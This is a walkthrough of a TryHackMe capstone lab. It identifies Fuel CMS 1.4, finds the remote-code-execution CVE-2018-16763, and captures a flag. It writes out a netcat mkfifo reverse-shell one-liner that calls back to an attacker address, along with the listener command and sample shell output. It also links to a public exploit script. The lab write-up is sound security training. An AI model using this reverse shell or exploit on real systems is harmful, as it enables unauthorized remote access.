---
title: TryHackMe - Vulnerabilities Capstone
description: A walkthrough of TryHackMe's challenge "Vulnerabilities Capstone".
categories: [Walkthrough THM, Vulnerability Research Module]
tags: [Basics]
pin: false
---

Lab access: [https://tryhackme.com/r/room/vulnerabilitycapstone](https://tryhackme.com/r/room/vulnerabilitycapstone)


## Introduction
Summarise the skills learnt in this module by completing this capstone room for the "Vulnerability Research" module. 

Ackme Support Incorporated has recently set up a new blog. Their developer team have asked for a security audit to be performed before they create and publish articles to the public. 

It is your task to perform a security audit on the blog; looking for and abusing any vulnerabilities that you find.

## Exploit the Machine (Flag Submission)

**Q: Deploy the vulnerable machine attached to this task & wait five minutes before visiting the vulnerable machine.**
Let's do this the way we would any other machine and start with an nmap scan:
![alt text](/assets/images/vulnerabilities_capstone_nmap.png)

We see that we have port 80 is open, so let's open a web browser and see what we find.

![alt text](/assets/images/vulnerabilities_capstone_q1.png)

Looking at the picture above we can answer the two following questions

**Q: What is the name of the application running on the vulnerable machine?**
<details><summary>Answer</summary>
Fuel CMS
</details>

---

**Q: What is the version number of this application?**
<details><summary>Answer</summary>
1.4
</details>

---

**Q: What is the number of the CVE that allows an attacker to remotely execute code on this application?**

We now have an application and a version number which should allow us to find a CVE for this

![alt text](/assets/images/vulnerabilities_capstone_ExploitDB.png)

Here we can see the CVE number 

<details><summary>Answer</summary>
CVE-2018-16763
</details>

---

**Q: Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.**

Let's try the exploit shown in the picture above.

![alt text](/assets/images/vulnerabilities_capstone_Exploit_1.png)

We get the following when running it correctly, which is not very helpful... Either we scrap this exploit and try another one, or we try to get a reverse shell using: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MY_IPADDRESS 4444 >/tmp/f` (have a look [here](https://saucer-man.com/reverse/) and try a few different vaiants).
We need to have netcat running on our end in another terminal, start it using `nc -nlvp 4444` (or with port of choice)

**Q: What is the value of the flag located on this vulnerable machine? This is located in /home/ubuntu on the vulnerable machine.**   

It will look something like this:
```shell
└─$ nc -nvlp 4444           
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 32850
/bin/sh: 0: can't access tty; job control turned off
$ cd /home/ubuntu
$ ls
flag.txt
$ cat flag.txt
THM{XXXXXXXXXX}
```

If you google on "Fuel CMS exploit" you will find a few exploits from gitHub as well. You could always use them instead, for example [this updated exploit from github](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated/blob/main/Fuel-Updated.py).

Happy hacking!